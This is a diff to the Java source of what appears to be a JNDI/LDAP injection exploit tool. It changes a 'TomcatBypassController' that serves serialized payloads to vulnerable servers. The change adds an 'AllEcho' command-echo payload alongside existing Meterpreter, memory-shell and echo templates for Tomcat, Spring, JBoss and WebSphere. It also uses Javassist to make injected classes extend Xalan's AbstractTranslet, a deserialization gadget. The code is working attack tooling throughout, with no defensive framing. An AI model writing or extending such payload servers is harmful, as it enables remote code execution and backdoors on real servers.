@@ -5,12 +5,9 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.gadgets.utils.InjShell;
+import com.nu1r.jndi.template.*;
 import com.nu1r.jndi.template.Agent.WinMenshell;
-import com.nu1r.jndi.template.Meterpreter;
-import com.nu1r.jndi.template.SpringEchoTemplate;
-import com.nu1r.jndi.template.TomcatEchoTemplate;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
-import com.nu1r.jndi.template.isSuccess;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
 import com.nu1r.jndi.template.jboss.JbossEcho;
@@ -142,6 +139,10 @@ public class TomcatBypassController implements LdapController {
                     break;
                 case jbossecho:
                     code = helper.injectJbossEcho();
+                    break;
+                case AllEcho:
+                    code = helper.injectAllEcho();
+                    break;
             }
 
             String payloadTemplate = "{" +
@@ -156,7 +157,7 @@ public class TomcatBypassController implements LdapController {
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
             System.out.println();
-        }catch (Throwable er){
+        } catch (Throwable er) {
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
         }
@@ -305,6 +306,10 @@ public class TomcatBypassController implements LdapController {
             return injectClass(SpringEchoTemplate.class);
         }
 
+        public String injectAllEcho() {
+            return injectClass(AllEcho.class);
+        }
+
         public String injectSuccess() {
             return injectClass(isSuccess.class);
         }
@@ -384,15 +389,15 @@ public class TomcatBypassController implements LdapController {
                         newClass.makeClassInitializer().insertBefore(className);
 
                         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                            CtClass superClass = pool.get(abstTranslet.getName());
+                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass   = pool.get(abstTranslet.getName());
                             newClass.setSuperclass(superClass);
                         }
 
                         return injectClass(newClass.getClass());
                 }
             }
-            
+
             return injectClass(ctClass.getClass());
         }
 
@@ -425,15 +430,15 @@ public class TomcatBypassController implements LdapController {
                         newClass.makeClassInitializer().insertBefore(className);
 
                         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                            CtClass superClass = pool.get(abstTranslet.getName());
+                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass   = pool.get(abstTranslet.getName());
                             newClass.setSuperclass(superClass);
                         }
 
                         return injectClass(newClass.getClass());
                 }
             }
-            
+
             return injectClass(ctClass.getClass());
         }
 
@@ -482,8 +487,8 @@ public class TomcatBypassController implements LdapController {
                         newClass.makeClassInitializer().insertBefore(className);
 
                         if (IS_INHERIT_ABSTRACT_TRANSLET) {
-                            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-                            CtClass superClass = pool.get(abstTranslet.getName());
+                            Class   abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+                            CtClass superClass   = pool.get(abstTranslet.getName());
                             newClass.setSuperclass(superClass);
                         }
 
